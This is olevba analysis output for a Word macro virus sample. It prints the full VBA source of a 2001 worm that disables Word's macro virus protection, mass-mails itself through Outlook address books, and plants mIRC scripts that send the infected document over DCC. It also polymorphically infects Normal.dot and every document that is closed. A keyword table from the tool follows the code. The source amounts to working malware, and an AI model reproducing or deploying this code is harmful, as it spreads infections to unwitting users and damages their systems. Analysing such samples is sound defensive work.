olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IMVM-90299d7ecfac800ac100b3876a70be1e01b7368a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IMVM-90299d7ecfac800ac100b3876a70be1e01b7368a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WPr.bas 
in file: Virus.MSWord.IMVM-90299d7ecfac800ac100b3876a70be1e01b7368a - OLE stream: 'Macros/VBA/WPr'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'MI_pirat's : S.P.R.E.A.D. Virus (Super Polymorphic Remorseless Email And Devastating Virus)
'Made on 27.04.2001 in Romania (where the f*** is this?U ask... EUROPE, AssHolez)
On Error Resume Next
StatusBar = "SPREAD"
zi = Day(Date)
If zi = 28 Then
MsgBox "S.P.R.E.A.D. has realy spread :) Visit: www.virii.s5.com !Go to sleep now", vbInformation, "U should know this!"
Application.Quit (False)
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "spread") <> "Yep" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "spread") = "Yep"
Options.VirusProtection = (2 Xor 2)
Options.SaveNormalPrompt = False
With Options
        .AllowFastSave = True
        .BackgroundSave = True
        .CreateBackup = False
        .SavePropertiesPrompt = False
        .ConfirmConversions = False
        .UpdateLinksAtOpen = True
        .SendMailAttach = True
End With
'E-mail infection
Dim DOutlook, DMapiName, BreakUmOffAS
Set DOutlook = CreateObject("Outlook.Application")
Set DMapiName = DOutlook.GetNameSpace("MAPI")
If DOutlook = "Outlook" Then
DMapiName.Logon "profile", "password"
For i = 1 To DMapiName.AddressLists.Count
Set ABook = DMapiName.AddressLists(i)
x = 1
Set BreakUmOffASlice = DOutlook.CreateItem(0)
For n = 1 To ABook.AddressEntries.Count
Pee = ABook.AddressEntries(x)
BreakUmOffAS.Recipients.Add Pee
x = x + 1
If x > 20 Then n = ABook.AddressEntries.Count
Next n
BreakUmOffAS.Subject = "Hy it's me: " & Application.UserName
BreakUmOffAS.Body = "More in the doc. "
BreakUmOffAS.Attachments.Add ActiveDocument.FullName
BreakUmOffAS.Send
Pee = ""
Next i
DMapiName.Logoff
End If
'mIRC is also useful for SPREAD(ing)
Dim nr, xxx, nume
nume = ActiveDocument.FullName
myDir = Dir("C:\mirc*", vbDirectory)
Do While myDir <> ""
ActiveDocument.SaveAs FileName:="C:\" + myDir + "\" + "mIRCstuf.doc"
ActiveDocument.SaveAs FileName:=nume
Call Kill("C:\" + myDir + "\aliases.ini")
Open "C:\" + myDir + "\aliases.ini" For Output As #1
Print #1, "[aliases]"
Print #1, "n0=/op /load -rs mircs.ini | /mode +ooo $$1 $2 $3"
Print #1, "n1=/dop /mode # -ooo $$1 $2 $3"
Print #1, "n2=/j /load -rs mIRCs.ini | /join #"
Print #1, "n3=/p /part #"
Print #1, "n4=/n /names #$$1"
Print #1, "n5=/w /whois $$1"
Print #1, "n6=/k /load -rs mircs.ini | /kick # $$1"
Print #1, "n7=/q /load -rs mircs.ini | /query $$1"
Print #1, "n8=/hop /part # | /join #$$1"
Print #1, "n9=/send /dcc send $1 mIRCstuf.doc"
Print #1, "n10=/chat /dcc chat $1"
Print #1, "n11=/ping /ctcp $$1 ping"
Close #1
Open "C:\" + myDir + "\" + "mirc.ini" For Append As #1
Print #1, "[Perform]"
Print #1, "n0=/load -rs mIRCs.ini"
Close #1
Open "C:\" + myDir + "\" + "mIRCs.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0=on 1:JOIN:#:{"
Print #1, "n1=/query $nick mIRCstuf.doc ,all about mIRC !"
Print #1, "n2=/send $nick mIRCstuf.doc"
Print #1, "n3=}"
Print #1, "n4=on 1:PART:#:{"
Print #1, "n5=/query $nick mIRCstuf.doc ,all about mIRC"
Print #1, "n6=/send $nick mIRCstuf.doc"
Print #1, "n7=}"
Print #1, "n8=on @1:text:*hy*:#:/kick $chan $nick"
Print #1, "n9=on @1:text:*sal*:#:/kick $chan $nick"
Print #1, "n10=on 1:text:*bye*:#:/quit I'm really Fucked Up Now...Gotta Go Suckerz!"
Print #1, "n11=on 1:op:#:/disconnect"
Print #1, "n12=on 1:deop:#:/query $nick Fuck You :)"
Close #1
myDir = Dir
Loop
'Infect this PC too !
Randomize (50)
nume = Chr(Int((57 * Rnd) + 65)) + Chr(Int((57 * Rnd) + 65)) + Chr(Int((57 * Rnd) + 65))
ActiveDocument.VBProject.VBComponents(2).Name = nume
StatusBar = nume
nr = ActiveDocument.VBProject.VBComponents.Item(2).CodeModule.CountOfLines
Set myTemplate = NormalTemplate
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=myTemplate.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems
For i = 1 To nr
xxx = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(i, 1)
poly = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
strn = xxx + " '" + poly
NormalTemplate.VBProject.VBComponents.Item(2).CodeModule.ReplaceLine i, strn
Next i
Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", Format:=wdOpenFormatAuto
ActiveDocument.Save
ActiveDocument.Close
End If
End Sub
Sub AutoClose()
'Infect the f***ing file
On Error Resume Next
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "Infectat" Then num = aVar.Index
Next aVar
If (num = 0) And (NormalTemplate.FullName <> ActiveDocument.FullName) Then
ActiveDocument.Variables.Add Name:="Infectat"
ActiveDocument.Variables("Infectat").Value = 1
Set myTemplate = NormalTemplate
Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=myTemplate.VBProject.VBComponents(2).Name, Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End If
End Sub
Sub ViewVBCode()
On Error Resume Next
Randomize (1000)
n = Int((100000 * Rnd) + 1)
For i = 1 To n
txt = Int((180 * Rnd) + 1)
Selection.TypeText Text:=Chr(txt)
Next i
MsgBox "WinWord Fatal error !", vbCritical, "Error at 453654[ecx]:9045{vxd}"
Application.Quit (False)
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

